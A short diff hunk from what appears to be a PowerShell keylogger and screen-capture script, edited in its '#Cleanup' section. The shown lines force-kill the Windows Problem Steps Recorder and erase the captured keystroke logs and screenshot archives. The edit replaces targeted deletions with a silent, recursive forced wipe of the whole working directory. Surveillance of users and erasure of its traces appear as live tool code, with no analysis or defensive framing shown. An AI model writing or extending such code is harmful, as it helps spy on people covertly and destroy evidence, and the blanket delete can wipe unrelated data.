@@ -175,10 +175,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
         
         #Cleanup
         Get-Process -Name psr | Stop-Process -Force
-        Remove-Item -Path "$dir\keylogger.txt" -Force -ErrorAction SilentlyContinue
-        Remove-Item -Path "$dir\problem_steps_record-*.zip" -Force -ErrorAction SilentlyContinue
-        Remove-Item -Path "$dir\*.mht" -Force -ErrorAction SilentlyContinue
-        Remove-Item -Path "$dir\steps.txt" -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path "$dir\*" -recurse -Force -ErrorAction SilentlyContinue
         
     }
 }
